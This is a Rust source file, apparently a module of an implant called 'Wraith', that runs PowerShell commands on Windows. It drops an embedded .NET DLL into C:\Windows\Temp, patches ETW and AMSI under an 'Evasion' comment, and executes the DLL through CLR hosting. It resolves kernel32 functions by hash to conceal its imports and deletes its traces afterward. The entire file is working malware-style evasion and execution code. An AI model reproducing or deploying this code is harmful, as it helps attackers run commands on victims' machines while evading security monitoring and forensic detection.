use alloc::format;
#[cfg(target_os = "windows")]
use alloc::vec::Vec;
use crate::utils::sensitive::SensitiveData;
#[cfg(target_os = "windows")]
use base64::{Engine as _, engine::general_purpose};

#[cfg(target_os = "windows")]
use crate::modules::clr::ClrHost;
#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub struct PowerShell;

// Real .NET assembly compiled from runner_src/Wraith.Runner
#[cfg(target_os = "windows")]
const RUNNER_DLL: &[u8] = include_bytes!("../../resources/Runner.dll");

impl PowerShell {
    pub fn exec(&self, cmd: &str) -> SensitiveData {
        #[cfg(target_os = "windows")]
        {
            let runner_path = "C:\\Windows\\Temp\\wraith_ps.dll";
            let output_path = "C:\\Windows\\Temp\\wraith_ps.out";
            
            // Base64 encode command to avoid quoting issues
            let b64_cmd = general_purpose::STANDARD.encode(cmd);
            let arg = format!("{}
{}", output_path, b64_cmd);

            match unsafe { self.drop_runner(runner_path) } {
                Ok(_) => {
                    // Evasion: Patch ETW and AMSI before execution
                    let _ = unsafe { crate::modules::patch::patch_etw() };
                    let _ = unsafe { crate::modules::patch::patch_amsi() };

                    let res = ClrHost::execute_assembly(
                        runner_path,
                        "Wraith.Runner",
                        "Run",
                        &arg
                    );
                    
                    // Read output
                    let output = unsafe { self.read_output_file(output_path) };
                    
                    // Cleanup
                    let _ = unsafe { self.delete_runner(runner_path) };
                    let _ = unsafe { self.delete_runner(output_path) };
                    
                    match res {
                        Ok(exit_code) => {
                            if let Some(out_bytes) = output {
                                let sd = SensitiveData::new(&out_bytes);
                                sd
                            } else {
                                let s = format!("Executed via CLR. Exit code: {} (Output missing)", exit_code);
                                SensitiveData::new(s.as_bytes())
                            }
                        },
                        Err(_) => SensitiveData::new(b"CLR Execution Failed")
                    }
                },
                Err(_) => SensitiveData::new(b"Failed to drop runner")
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            crate::modules::shell::Shell.exec(&format!("pwsh -c \"{}\"", cmd))
        }
    }

    #[cfg(target_os = "windows")]
    unsafe fn drop_runner(&self, path: &str) -> Result<(), ()> {
        // Verify we have a valid PE header (minimal check)
        if RUNNER_DLL.len() < 1024 { 
             // If this fails, the Runner.dll is likely the placeholder
             return Err(());
        }
        if RUNNER_DLL[0] != 0x4D || RUNNER_DLL[1] != 0x5A { // MZ
             return Err(());
        }

        let kernel32_hash = hash_str(b"kernel32.dll");
        let create_file_hash = hash_str(b"CreateFileA");
        let write_file_hash = hash_str(b"WriteFile");
        let close_handle_hash = hash_str(b"CloseHandle");

        let create_file = resolve_function(kernel32_hash, create_file_hash);
        let write_file = resolve_function(kernel32_hash, write_file_hash);
        let close_handle = resolve_function(kernel32_hash, close_handle_hash);

        if create_file.is_null() || write_file.is_null() || close_handle.is_null() {
            return Err(());
        }

        // CreateFileA signature
        type FnCreateFileA = unsafe extern "system" fn(
            *const u8, u32, u32, *mut c_void, u32, u32, *mut c_void
        ) -> *mut c_void;
        // WriteFile signature
        type FnWriteFile = unsafe extern "system" fn(
            *mut c_void, *const u8, u32, *mut u32, *mut c_void
        ) -> i32;
        // CloseHandle signature
        type FnCloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

        let create_file_fn: FnCreateFileA = core::mem::transmute(create_file);
        let write_file_fn: FnWriteFile = core::mem::transmute(write_file);
        let close_handle_fn: FnCloseHandle = core::mem::transmute(close_handle);

        // Null-terminate path
        let mut path_bytes = Vec::from(path.as_bytes());
        path_bytes.push(0);

        let handle = create_file_fn(
            path_bytes.as_ptr(),
            0x40000000, // GENERIC_WRITE
            0,          // No share
            core::ptr::null_mut(),
            2,          // CREATE_ALWAYS
            0x80,       // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut()
        );

        if handle == (-1isize as *mut c_void) { // INVALID_HANDLE_VALUE
            return Err(());
        }

        let mut written = 0;
        let success = write_file_fn(
            handle,
            RUNNER_DLL.as_ptr(),
            RUNNER_DLL.len() as u32,
            &mut written,
            core::ptr::null_mut()
        );

        close_handle_fn(handle);

        if success == 0 {
            return Err(());
        }

        Ok(())
    }

    #[cfg(target_os = "windows")]
    unsafe fn read_output_file(&self, path: &str) -> Option<Vec<u8>> {
        let kernel32_hash = hash_str(b"kernel32.dll");
        let create_file_hash = hash_str(b"CreateFileA");
        let read_file_hash = hash_str(b"ReadFile");
        let get_file_size_hash = hash_str(b"GetFileSize");
        let close_handle_hash = hash_str(b"CloseHandle");

        let create_file = resolve_function(kernel32_hash, create_file_hash);
        let read_file = resolve_function(kernel32_hash, read_file_hash);
        let get_file_size = resolve_function(kernel32_hash, get_file_size_hash);
        let close_handle = resolve_function(kernel32_hash, close_handle_hash);

        if create_file.is_null() || read_file.is_null() || get_file_size.is_null() || close_handle.is_null() {
            return None;
        }

        type FnCreateFileA = unsafe extern "system" fn(*const u8, u32, u32, *mut c_void, u32, u32, *mut c_void) -> *mut c_void;
        type FnReadFile = unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut c_void) -> i32;
        type FnGetFileSize = unsafe extern "system" fn(*mut c_void, *mut u32) -> u32;
        type FnCloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

        let create_file_fn: FnCreateFileA = core::mem::transmute(create_file);
        let read_file_fn: FnReadFile = core::mem::transmute(read_file);
        let get_file_size_fn: FnGetFileSize = core::mem::transmute(get_file_size);
        let close_handle_fn: FnCloseHandle = core::mem::transmute(close_handle);

        let mut path_bytes = Vec::from(path.as_bytes());
        path_bytes.push(0);

        let handle = create_file_fn(
            path_bytes.as_ptr(),
            0x80000000, // GENERIC_READ
            1,          // FILE_SHARE_READ
            core::ptr::null_mut(),
            3,          // OPEN_EXISTING
            0x80,       // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut()
        );

        if handle == (-1isize as *mut c_void) {
            return None;
        }

        let size = get_file_size_fn(handle, core::ptr::null_mut());
        if size == 0xFFFFFFFF {
             close_handle_fn(handle);
             return None;
        }

        let mut buffer = alloc::vec![0u8; size as usize];
        let mut read = 0;
        let success = read_file_fn(handle, buffer.as_mut_ptr(), size, &mut read, core::ptr::null_mut());
        
        close_handle_fn(handle);

        if success == 0 {
            return None;
        }
        
        buffer.truncate(read as usize);
        Some(buffer)
    }

    #[cfg(target_os = "windows")]
    unsafe fn delete_runner(&self, path: &str) -> Result<(), ()> {
        let kernel32_hash = hash_str(b"kernel32.dll");
        let delete_file_hash = hash_str(b"DeleteFileA");
        let delete_file = resolve_function(kernel32_hash, delete_file_hash);

        if delete_file.is_null() {
            return Err(());
        }

        type FnDeleteFileA = unsafe extern "system" fn(*const u8) -> i32;
        let delete_file_fn: FnDeleteFileA = core::mem::transmute(delete_file);

        let mut path_bytes = Vec::from(path.as_bytes());
        path_bytes.push(0);

        if delete_file_fn(path_bytes.as_ptr()) == 0 {
            Err(())
        } else {
            Ok(())
        }
    }
}
